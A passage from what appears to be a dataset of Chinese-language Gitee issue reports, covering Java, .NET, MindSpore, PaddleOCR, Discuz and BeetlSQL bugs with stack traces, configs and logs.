org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)"
Admin 模块启动提示: 使用不当，会额外暴露接口,"环境信息 pigx版本: V 4.2 是否修改包名: 否 提供详细   <code>: @Inner 标记接口 ==&gt; {}.{} 使用不当，会额外暴露接口 ==&gt; {}.{} 请知悉"" if (PATHMATCHER.match(url, pattern)) { HandlerMethod rqMethod = map.get(rq); HandlerMethod infoMethod = map.get(info); log.error(""@Inner 标记接口 ==&gt; {}.{} 使用不当，会额外暴露接口 ==&gt; {}.{} 请知悉"", rqMethod.getBeanType().getName(), rqMethod.getMethod().getName(), infoMethod.getBeanType().getName(), infoMethod.getMethod().getName()); }"
"Duplicate method name ""$$$getFont$$$"" with signature ","之前我没有接触过IntelliJ 生成GUI功能，下载项目后我根据作者说明文档配置了idea，然后就运行就出现了这个错误 然后我查看该项目相关的issue，发现之前已经有人提出过这个问题，作者给出的解决方案是clean一下。我不清楚idea的clean操作在哪，去网上查了一下应该是 Invalidate Caches/Restart 这个操作，但是我尝试后错误依然没有解决。 是我操作的有问题吗？   <code>: Exception in thread ""main"" java.lang.ClassFormatError: Duplicate method name ""$$$getFont$$$"" with signature ""(Ljava.lang.String;IILjava.awt.Font;)Ljava.awt.Font;"" in class file com/fangxuele/tool/push/ui/form/LoadingForm at java.lang.ClassLoader.defineClass1(Native Method) at java.lang.ClassLoader.defineClass(ClassLoader.java:763) at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142) at java.net.URLClassLoader.defineClass(URLClassLoader.java:468) at java.net.URLClassLoader.access$100(URLClassLoader.java:74) at java.net.URLClassLoader$1.run(URLClassLoader.java:369) at java.net.URLClassLoader$1.run(URLClassLoader.java:363) at java.security.AccessController.doPrivileged(Native Method) at java.net.URLClassLoader.findClass(URLClassLoader.java:362) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:349) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at com.fangxuele.tool.push.App.main(App.java:40)"
[CT][MS][OCCM][UnravelIndex] The testcase of GPU operator UnravelIndex have Segmentation fault.,"The testcase of GPU operator UnravelIndex have Segmentation fault The testcase of GPU operator UnravelIndex have Segmentation fault / 硬件环境: /device /GPU/ : -- MindSpore version : -- Python version : Python 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : (/): /mode pynative /mode graph ops文件里面写需要保证input_indices的元素的值不超过input_dims_np的元素值乘积。 为什么要有这个限制？CPU和Ascend是没有的 拿这样的输入去跑，应该能够跑通或者抛出异常。无论如何也不能出现core dump的情况 第一种，用例直接Segmentation fault(core dump) 第二种，用例能通过，但执行完成后出现Segmentation fault 第二种，用例能通过，但执行完成后出现Segmentation fault   <code>: def test_unravelindex_indices_0d_int32(): input_list = [] x0 = Tensor(np.random.randint(5), dtype=mstype.int32) input_list.append(x0) x1 = Tensor(np.random.randint(5, 100, size=2), dtype=mstype.int32) input_list.append(x1) fact = UnravelIndexMock(inputs=input_list) fact.forward_cmp() def test_unravelindex_indices_0d_int64(): input_list = [] x0 = Tensor(np.random.randint(5), dtype=mstype.int64) input_list.append(x0) x1 = Tensor(np.random.randint(5, 100, size=1), dtype=mstype.int64) input_list.append(x1) fact = UnravelIndexMock(inputs=input_list) fact.forward_cmp() def test_unravelindex_indices_out_of_boundary(): input_list = [] x0 = Tensor(np.random.randint(1, 100, size=100).astype(np.int64)) input_list.append(x0) x1 = Tensor(np.random.randint(1, 100, size=1000).astype(np.int64)) input_list.append(x1) fact = UnravelIndexMock(inputs=input_list) with pytest.raises((ValueError, RuntimeError)): fact.forward_mindspore_impl() def test_unravel_index_negative_index(): input_list = [] dims_shape = 3 input_list.append(Tensor(np.array([-1, 3]).astype(np.int64))) input_list.append(Tensor(np.random.uniform(3, 10, dims_shape).astype(np.int64))) fact = UnravelIndexMock(inputs=input_list) with pytest.raises((RuntimeError, ValueError)): fact.forward_mindspore_impl() def test_unravel_negative_input_2(): input_list = [] index_shape = 2 input_list.append(Tensor(np.random.uniform(0, 5, index_shape).astype(np.int64))) input_list.append(Tensor(np.array([-1, 3]).astype(np.int64))) fact = UnravelIndexMock(inputs=input_list) with pytest.raises((RuntimeError, ValueError)): fact.forward_mindspore_impl() ============================================================================ test session starts ============================================================================ platform linux -- Python 3.7.5, pytest-5.3.5, py-1.8.1, pluggy-0.13.1 rootdir: /data1/zja/MindSporeTest_GPU/operations plugins: repeat-0.9.1, timeout-1.3.4 collected 1 item test_unravelindex.py . [100%] ============================================================================= warnings summary ============================================================================== /root/miniconda3/envs/zja/lib/python3.7/site-packages/tensorflow/python/autograph/impl/api.py:22 /root/miniconda3/envs/zja/lib/python3.7/site-packages/tensorflow/python/autograph/impl/api.py:22: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses import imp -- Docs: https://docs.pytest.org/en/latest/warnings.html ======================================================================= 1 passed, 1 warning in 8.33s ======================================================================== [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.612.473 [mindspore/ccsrc/pipeline/jit/init.cc:378] operator()] Start releasing dataset handles... [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.612.517 [mindspore/ccsrc/pipeline/jit/init.cc:381] operator()] End release dataset handles. [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.612.526 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1864] FinalizeCluster] Start finalize the cluster instance. [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.612.542 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1871] FinalizeCluster] End finalize the cluster instance. [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.612.556 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1709] ClearResAtexit] Pipeline clear all resource [ERROR] DEVICE(63827,7f590614a740,python):2022-08-17-10:13:39.612.633 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:167] SyncStream] cudaStreamSynchronize failed, ret[710], device-side assert triggered [ERROR] ME(63827,7f590614a740,python):2022-08-17-10:13:39.612.654 [mindspore/ccsrc/runtime/hardware/device_context_manager.cc:89] WaitTaskFinishOnDevice] SyncStream failed [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.612.666 [mindspore/ccsrc/pipeline/jit/pipeline.cc:208] RecordExitStatus] Status record: system exit. [INFO] ME(63827,7f590614a740,python):2022-08-17-10:13:39.612.736 [mindspore/core/mindrt/src/actor/actormgr.cc:151] Finalize] mindrt Actors finish exiting. [INFO] ME(63827,7f590614a740,python):2022-08-17-10:13:39.612.750 [mindspore/core/mindrt/src/actor/actormgr.cc:154] Finalize] mindrt Threads finish exiting. [INFO] ME(63827,7f590614a740,python):2022-08-17-10:13:39.622.170 [mindspore/core/mindrt/src/actor/actormgr.cc:165] Finalize] mindrt IOMGRS finish exiting. [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.191 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1738] ClearResAtexit] Start clear kernel runtime... [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.207 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1740] ClearResAtexit] End clear kernel runtime. [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.212 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1742] ClearResAtexit] Start Finalize StreamSynchronizer... [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.219 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1744] ClearResAtexit] End Finalize StreamSynchronizer... [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.839 [mindspore/ccsrc/pipeline/jit/pipeline.cc:575] ClearRes] Clean executor resource! [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.851 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1759] ClearResAtexit] Start clear PyNativeExecutor... [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.892 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1761] ClearResAtexit] End clear PyNativeExecutor. [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.900 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1763] ClearResAtexit] Start clear PyPassManager... [INFO] OPTIMIZER(63827,7f590614a740,python):2022-08-17-10:13:39.622.906 [mindspore/ccsrc/frontend/optimizer/py_pass_manager.cc:93] ClearRes] Clear PyPassManager resources! [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.917 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1765] ClearResAtexit] End clear PyPassManager. [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.927 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1777] ClearResAtexit] Start clear ConfigManager... [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.936 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1779] ClearResAtexit] End clear ConfigManager. [INFO] PIPELINE(63827,7f590614a740,python):2022-08-17-10:13:39.622.942 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1787] ClearResAtexit] Start clear device context... [INFO] ME(63827,7f590614a740,python):2022-08-17-10:13:39.622.948 [mindspore/ccsrc/runtime/hardware/device_context_manager.cc:35] ClearDeviceContexts] Release device GPU_0 [ERROR] DEVICE(63827,7f590614a740,python):2022-08-17-10:13:39.622.968 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:158] DestroyStream] cudaStreamDestroy failed, ret[710], device-side assert triggered [ERROR] DEVICE(63827,7f590614a740,python):2022-08-17-10:13:39.622.975 [mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_device_manager.cc:60] ReleaseDevice] Op Error: Failed to destroy CUDA stream. | Error Number: 0 [ERROR] DEVICE(63827,7f590614a740,python):2022-08-17-10:13:39.622.981 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:158] DestroyStream] cudaStreamDestroy failed, ret[710], device-side assert triggered [ERROR] DEVICE(63827,7f590614a740,python):2022-08-17-10:13:39.622.991 [mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_device_manager.cc:60] ReleaseDevice] Op Error: Failed to destroy CUDA stream. | Error Number: 0 [ERROR] DEVICE(63827,7f590614a740,python):2022-08-17-10:13:39.623.215 [mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_device_manager.cc:66] ReleaseDevice] cuDNN Error: Failed to destroy cuDNN handle | Error Number: 4 CUDNN_STATUS_INTERNAL_ERROR [INFO] PRE_ACT(63827,7f590614a740,python):2022-08-17-10:13:39.623.682 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:464] operator()] Common mem pool info: Total allocated mem:1024M, peak used mem:0M, in used mem:0M, total idle mem:1024M. Block unit size:1024M, block counts:1, block[0] block size:1024M idle size:1024M [INFO] PRE_ACT(63827,7f590614a740,python):2022-08-17-10:13:39.623.697 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:464] operator()] Persistent mem pool info: Total allocated mem:1024M, peak used mem:0M, in used mem:0M, total idle mem:1024M. Block unit size:1024M, block counts:1, block[0] block size:1024M idle size:1024M [INFO] PRE_ACT(63827,7f590614a740,python):2022-08-17-10:13:39.623.705 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:474] DumpDynamicMemPoolStateInfo] The dynamic memory pool total allocated mem:2048M, peak used mem:0M, in used mem:0M, total idle mem:2048M. Weight used size:0M, constant value used size:0M, kernel output used size:0M, other used size:0M. [ERROR] DEVICE(63827,7f590614a740,python):2022-08-17-10:13:39.623.719 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:48] FreeDeviceMem] cudaFree failed, ret[710], device-side assert triggered [INFO] DEBUG(63827,7f590614a740,python):2022-08-17-10:13:39.623.732 [mindspore/ccsrc/pipeline/jit/debug/trace.cc:115] TraceGraphEval] Length of analysis graph stack is empty. [INFO] DEBUG(63827,7f590614a740,python):2022-08-17-10:13:39.623.742 [mindspore/ccsrc/pipeline/jit/debug/trace.cc:382] GetEvalStackInfo] Get graph analysis information begin [INFO] DEBUG(63827,7f590614a740,python):2022-08-17-10:13:39.623.750 [mindspore/ccsrc/pipeline/jit/debug/trace.cc:385] GetEvalStackInfo] Length of analysis information stack is empty. Error in atexit._run_exitfuncs: RuntimeError: Free device memory[0x7f53f8000000] error. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:428 operator() Segmentation fault"
Learning rate scheduler performance issue,"In our current learning rate scheduler implementation, the is a CPU scalar variable. It results in a problem that every time a parameter is updated, Fluid has to launch a kernel to copy the scalar to GPU. It is extremely inefficient.   <code>: learning rate learning rate"
泛型依赖注入出错,"泛型依赖注入出错 System.ArgumentException:“Open generic service type 'YFurion.IA`2[Tkey,TResult]' requires registering an open generic implementation type. Arg_ParamName_Name” public interface IA&lt;Tkey,TResult&gt; { string B(); } 能支持   <code>: public class A&lt;Tkey, TResul&gt; : IA&lt;Tkey, TResul&gt;, ITransient { public string B() { throw new NotImplementedException(); } } public interface IA&lt;Tkey&gt;: IA&lt;Tkey, Tkey&gt; { string AA(); } public class A&lt;Tkey&gt; : A&lt;Tkey, Tkey&gt;, IA&lt;Tkey&gt; { public string AA() { throw new NotImplementedException(); } } public interface IB : IA&lt;string&gt; { string AAA(); } public class B : A&lt;string&gt;, IB { public string AAA() { throw new NotImplementedException(); } }"
"[MS][LITE][master][parallel]CPU_FP32+ml_ei_headpose, crash in all phones",": /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : ml_ei_headpose_CPU_FP32,所有机型均segment fault. 日志：http://10.175.124.22/dist/4975688964077256704/tc_fmk_GE_NET_LITE_new_net_with_ml_audio_kit_vocals_test_0001.log 初始化context，context-&gt;enable_parallel_ = true; ml_ei_headpose_CPU_FP32,所有机型均segment fault.   <code>: 06-30 03:38:18.980 20059 20059 F DEBUG : Cause: null pointer dereference&lt;/br&gt; 06-30 03:38:18.980 20059 20059 F DEBUG : x0 0000000000000000 x1 0000007a7933b120 x2 0000007a7933b020 x3 0000000000000003&lt;/br&gt; 06-30 03:38:18.980 20059 20059 F DEBUG : x4 0000000000000003 x5 0000000000000000 x6 0000005f44cd626c x7 0000000300000001&lt;/br&gt; 06-30 03:38:18.980 20059 20059 F DEBUG : x8 0000000000000003 x9 0000000000000003 x10 0000007a7933b020 x11 0000007a7933b120&lt;/br&gt; 06-30 03:38:18.980 20059 20059 F DEBUG : x12 0000000000000000 x13 0000000000000030 x14 000000000000000d x15 aaaaaaaaaaaaaaab&lt;/br&gt; 06-30 03:38:18.980 20059 20059 F DEBUG : x16 0000007a7a25f230 x17 0000007a7a1b2dd0 x18 0000007a792b7c9c x19 0000000000000003&lt;/br&gt; 06-30 03:38:18.980 20059 20059 F DEBUG : x20 0000007a7933b020 x21 0000007a7933b120 x22 0000000000000000 x23 0000007a797ada40&lt;/br&gt; 06-30 03:38:18.980 20059 20059 F DEBUG : x24 0000000000000000 x25 0000007a795ff588 x26 0000000000000001 x27 0000007a79211008&lt;/br&gt; 06-30 03:38:18.980 20059 20059 F DEBUG : x28 0000007a79211008 x29 0000000000000001 x30 0000005f44cd6498&lt;/br&gt; 06-30 03:38:18.980 20059 20059 F DEBUG : sp 0000007a795feb70 pc 0000005f44da228c pstate 0000000080000000&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG :&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : backtrace:&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #00 pc 000000000020f28c /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #01 pc 0000000000143494 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #02 pc 0000000000143bf4 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #03 pc 0000000000123a54 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #04 pc 00000000001235b4 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #05 pc 000000000009da00 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #06 pc 0000000000143dec /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #07 pc 00000000000ca114 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #08 pc 00000000000cbe30 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #09 pc 00000000000cf700 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #10 pc 000000000010b568 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #11 pc 000000000010b158 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #12 pc 0000000000113680 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #13 pc 000000000011378c /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #14 pc 000000000011c524 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #15 pc 0000000000120b3c /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #16 pc 0000000000121590 /data/local/tmp/new_net_test_mslite&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #17 pc 0000000000068560 /system/lib64/libc.so (_ZL15__pthread_startPv+36)&lt;/br&gt; 06-30 03:38:18.991 20059 20059 F DEBUG : #18 pc 000000000001f9f4 /system/lib64/libc.so (__start_thread+68)&lt;/br&gt;"
UIMessageTtip Closing引发的Null异常,_hInstance ?.为null不执行后面的子方法，但是会返回null 修改为   <code>: /// &lt;summary&gt; /// 窗体关闭时 /// &lt;/summary&gt; public event CancelEventHandler Closing; static IntPtr _hInstance; static IntPtr HInstance { get { if (_hInstance == IntPtr.Zero) { Assembly assembly = Assembly.GetEntryAssembly(); if (assembly !=null) { _hInstance = Marshal.GetHINSTANCE(assembly.ManifestModule); } } return _hInstance; } }
使用easyExcel导出excel(填充)，后台功能正常，导出前端报错,"前端导出excel,JS报错   <code>: (https://images.gitee.com/uploads/images/2021/0818/162004_855f10d3_8342336.jpeg ""Snipaste_2021-08-18_16-19-41.jpg"") (https://images.gitee.com/uploads/images/2021/0818/162033_b216a75e_8342336.jpeg ""Snipaste_2021-08-18_16-20-15.jpg"") (https://images.gitee.com/uploads/images/2021/0818/162041_e9394f2a_8342336.jpeg ""Snipaste_2021-08-18_16-20-23.jpg"")"
使用通用模型解析图片出现服务停止,"采用通用模型解析图片时，hub会停止服务，采用轻量的那个没问题，请问如何解决，是需要调整pamras吗？ cfg = Config()   <code>: #params for text detector cfg.det_algorithm = ""DB"" cfg.det_model_dir = ""./inference/ch_det_r50_vd_db/"" cfg.det_max_side_len = 960 #DB parmas cfg.det_db_thresh =0.3 cfg.det_db_box_thresh =0.5 cfg.det_db_unclip_ratio =2.0 #EAST parmas cfg.det_east_score_thresh = 0.8 cfg.det_east_cover_thresh = 0.1 cfg.det_east_nms_thresh = 0.2 #params for text recognizer cfg.rec_algorithm = ""CRNN"" cfg.rec_model_dir = ""./inference/ch_rec_r34_vd_crnn/"" cfg.rec_image_shape = ""3, 32, 320"" cfg.rec_char_type = 'ch' cfg.rec_batch_num = 30 cfg.rec_char_dict_path = ""./ppocr/utils/ppocr_keys_v1.txt"" cfg.use_space_char = True"
admin.req() 如何来指定接收 blob 类型的数据,"我想通过上面的方式来完成下载，我该怎么做   <code>: admin.req('/czy/downloadFile', params, function(res) { if (res.code == 200) { var a = document.createElement(""a""); var blob = new Blob([res], {type:'application/vnd.openxmlformats-officedocument.wordprocessingml.document'}) a.style.display = 'none'; a.href = URL.createObjectURL(blob); a.download = fileName; document.body.appendChild(a); a.click(); document.body.removeChild(a); console.log(res); }else { layer.msg(""下载异常""); }"
Add a cross entropy beam layer for learning to search model.,"This layer is used in learning to search models, which is to solve complex joint prediction problems based on learning to search through a problem-defined search space. Specifically, the learning to search process for this layer begins with searching a target sequence from a nested sequence. In the first search step, top beam size sequences with highest scores, indices of these top k sequences in the original nested sequence, and the ground truth (also called gold) altogether (a triple) make up of the first beam. Then, several special positions, for example, start and end positions that define meaningful segments are searched. In these searches, top k positions with highest scores are selected, and then sequence, starting from the selected starts till ends of the sentences (or any fixed position) are taken to search next. We call the possible top k results returned in one search the beam. This search process can be repeated for pre-defined turns and leads to several beam expansions. Finally, the layer takes all the beam expansions which contain several candidate targets found along the multi-step search process. calculates cross entropy over the expanded beams with all the candidates in the beam as the normalized factor. Note that, if gold falls off the beam at search step $t$, then the cost is calculated over the beam at step $t$. This cost layer always works together with , , and to trim the input to form a sub-search space.   <code>: cross_entropy_over_beam cross_entropy_over_beam kmax_sequence_score_layer sub_nested_seq_layer sequence_slice_layer"
一个偶然但是很严重的BUG，偶现发帖失败，图片无法上传成功，重新编辑无用，反而多出来一个一模一样的贴,疑似问题重现步骤 一个偶然但是很严重的BUG，偶现发帖失败，图片无法上传成功，重新编辑无用，反而多出来一个一模一样的贴子，编辑几次就多出来几个，详细，看图片 报错信息 无 为解决问题做过哪些尝试 版本信息 Discuz! 版本:Discuz! X3.4 R20210816 UTF-8 Release 版本:UCenter 1.6.0 Release 20170101 服务器系统版本:Linux / PHP v5.6.40 PHP 版本:Linux / PHP v5.6.40 MySQL / MariaDB 版本:5.6.50-log 内存缓存类型和版本:暂无 其他信息   <code>: 无从下手，不知道该去哪里找问题
积木报表1.5.0报表SQL调用存储过程出错，提示“解析失败或数据为空”,版本号： jeecg-boot 3.2.0 积木报表1.5.0 jeecg-boot 3.2.0+积木报表1.5.0报表SQL调用存储过程出错，点击“SQL解析”提示“解析失败或数据为空”， jeecg-boot 3.1.0+积木报表1.4.32正常。 END   <code>: gov % sp_test
iputils的问题,"isempty是不是条件写反了？   <code>: // 使用代理，则获取第一个IP地址 if (StringUtils.isEmpty(ip) &amp;&amp; ip.length() &gt; 15) { if (ip.indexOf("","") &gt; 0) { ip = ip.substring(0, ip.indexOf("","")); } }"
入门者求解，	beetlsql文档-快速开始-代码例子-运行前五行代码，一直报NoClassDefFoundError或ClassNotFoundException异常，怎么解决,"我是初次使用beetlsql，下载 beetlsql-2.12.12.jar和beetl-3.0.11.jar 的jar包，拷贝到eclipce到控制java台程序，阅读beetlsql文档，照着快速开始-代码例子的前五行代码， 拷贝如下代码，并修改部分，同时前面填写driver，url，userName，password信息 运行，报错 Exception in thread ""main"" java.lang.NoClassDefFoundError: org/antlr/v4/runtime/CharStream at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Unknown Source) at org.beetl.core.TemplateEngineFactory.getEngine(TemplateEngineFactory.java:16) at org.beetl.core.GroupTemplate.init(GroupTemplate.java:171) at org.beetl.core.GroupTemplate.(GroupTemplate.java:152) at org.beetl.core.GroupTemplate.(GroupTemplate.java:142) at org.beetl.sql.core.engine.Beetl.(Beetl.java:27) at org.beetl.sql.core.SQLManager.(SQLManager.java:149) at org.beetl.sql.core.SQLManager.(SQLManager.java:134) at org.beetl.sql.core.SQLManager.(SQLManager.java:129) at org.beetl.sql.core.SQLManager.(SQLManager.java:116) at com.xx.test.Test1.main(Test1.java:36) Caused by: java.lang.ClassNotFoundException: org.antlr.v4.runtime.CharStream at java.net.URLClassLoader.findClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) ... 12 more 错误指向的是 SQLManager sqlManager = new SQLManager(mysql,loader,source,nc,new Interceptor[]{new DebugInterceptor()}); 这一行 我不知道为什么会报错。我确定jdbc信息是没有错误的，而且是直接拷贝含有mybatis的项目上jdbc信息填写的，那个项目运行都没有报jdbc错误，我确定jdbc信息没有错误，数据库也是存在的，为什么会这样，我以为可能是jar报问题，然后把两个jar包换成了beetlsql-2.10.18.jar和beetl-2.9.6.jar，然后运行依然报错。只不过不一样 报错信息不一样，但依然还是指向还是 SQLManager sqlManager = new SQLManager(mysql,loader,source,nc,new Interceptor[]{new DebugInterceptor()}); 这一行，只不过换成了initDefaultSchema Exception in thread ""main"" java.lang.RuntimeException: 驱动未发现:org.postgresql.Driver at org.beetl.sql.core.SimpleConnectoinSource._getConn(ConnectionSourceHelper.java:57) at org.beetl.sql.core.SimpleConnectoinSource.getMaster(ConnectionSourceHelper.java:66) at org.beetl.sql.core.SimpleConnectoinSource.getMetaData(ConnectionSourceHelper.java:97) at org.beetl.sql.core.db.MetadataManager.initDefaultSchema(MetadataManager.java:272) at org.beetl.sql.core.db.MetadataManager.(MetadataManager.java:33) at org.beetl.sql.core.SQLManager.initMetadataManager(SQLManager.java:247) at org.beetl.sql.core.SQLManager.(SQLManager.java:179) at org.beetl.sql.core.SQLManager.(SQLManager.java:155) at org.beetl.sql.core.SQLManager.(SQLManager.java:150) at org.beetl.sql.core.SQLManager.(SQLManager.java:124) at com.tc.test.Test1.main(Test1.java:42) Caused by: java.lang.ClassNotFoundException: org.postgresql.Driver at java.net.URLClassLoader.findClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source) at java.lang.ClassLoader.loadClass(Unknown Source) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Unknown Source) at org.beetl.sql.core.SimpleConnectoinSource._getConn(ConnectionSourceHelper.java:53) ... 10 more 我确定驱动信息没有错误，后来我试着随便填写jdbc信息，运行测试发现，不管你jdbc信息写的是什么，异常错误信息都一个样。这到底是什么原因，还缺少了什么关键代码？还是SQLManager sqlManager = new SQLManager(mysql,loader,source,nc,new Interceptor[]{new DebugInterceptor()});这一行有问题？我可以照着文档打的啊，这都能出错。是beelt和beeltsql的jar包对应的版本问题吗？   <code>: ConnectionSource source = ConnectionSourceHelper.getSimple(driver, url, userName, password); DBStyle mysql = new PostgresStyle(); // sql语句放在classpagth的/sql 目录下 SQLLoader loader = new ClasspathLoader(""/sql""); // 数据库命名跟java命名一样，所以采用DefaultNameConversion，还有一个是UnderlinedNameConversion，下划线风格的， UnderlinedNameConversion nc = new UnderlinedNameConversion(); // 最后，创建一个SQLManager,DebugInterceptor 不是必须的，但可以通过它查看sql执行情况 SQLManager sqlManager = new SQLManager(mysql,loader,source,nc,new Interceptor[]{new DebugInterceptor()});"
【众智】【计算-AICPU开发】ConjugateTranspose,"AICPU算子接入 计算复数矩阵的共轭转置。 x perm tuple[int] y 对应底层算子 对应底层AICPU算子ConjugateTranspose: Classify Name Type Type Range Required Format类型 Input x BasicType,complex64,complex128 TRUE ND Input perm int32,int64 TRUE 1D Output y BasicType,complex64,complex128 TRUE ND Tensorflow接口tf.raw_ops.ConjugateTranspose： https://tensorflow.google.cn/api_docs/python/tf/raw_ops/ConjugateTranspose 3. 异常处理 4. 算子反向 接入反向算子ConjugateTransposeGrad。参考TensorFlow框架tensorflow/python/ops/array_grad.py文件 @ops.RegisterGradient(""ConjugateTranspose"")   <code>: class ConjugateTranspose(Primitive):"
【MindSpore】【Ascend】【C类】【ecapa_tdnn】在执行1p训练后出现报错跑不通,"【Document Link】/【文档链接】 ecapa_tdnn/train.log 【Issues Section】/【问题文档片段】 执行bash scripts/run_standalone_train_ascend.sh 0命令后，查看ecapa_tdnn/train.log文件 <ol start=""3""> 【Existing Issues】/【存在的问题】 1P训练报错 【Expected Result】【预期结果】 1P能正常跑通生成文件 5、环境信息 -- CANN 版本: (CANN 5.1.RC2 B103) -- python 版本:Python 3.7.5 -- 操作系统版本:Ubuntu 18.04.6   <code>: [WARNING] DEVICE(46,ffffafb891a0,python3):2022-10-08-07:14:12.506.808 [mindspore/ccsrc/plugin/device/ascend/hal/device/kernel_select_ascend.cc:330] FilterRaisedOrReducePrecisionMatchedKernelInfo] Operator:[Default/network-BuildTrainNetwork/onehot-OneHot/OneHot-op3520] don't support int64, reduce precision from int64 to int32. [WARNING] DEVICE(46,ffffafb891a0,python3):2022-10-08-07:14:30.715.094 [mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_stream_assign.cc:1942] InsertEventForCallCommSubGraph] Cannot find comm group for sub comm graph label id 2 [WARNING] DEVICE(46,ffffafb891a0,python3):2022-10-08-07:14:33.261.986 [mindspore/ccsrc/plugin/device/ascend/hal/device/kernel_select_ascend.cc:330] FilterRaisedOrReducePrecisionMatchedKernelInfo] Operator:[Default/Equal-op5361] don't support int64, reduce precision from int64 to int32. {} group_size:1, data total len:9373 ============== Starting Training ============== 2022-10-08 07:14:33.657371, epoch:1/3, iter-0/9373,cur loss:16.8970, aver loss:16.8970,total_avg loss:16.8970, acc_aver:0.0000 2022-10-08 07:44:20.431734, 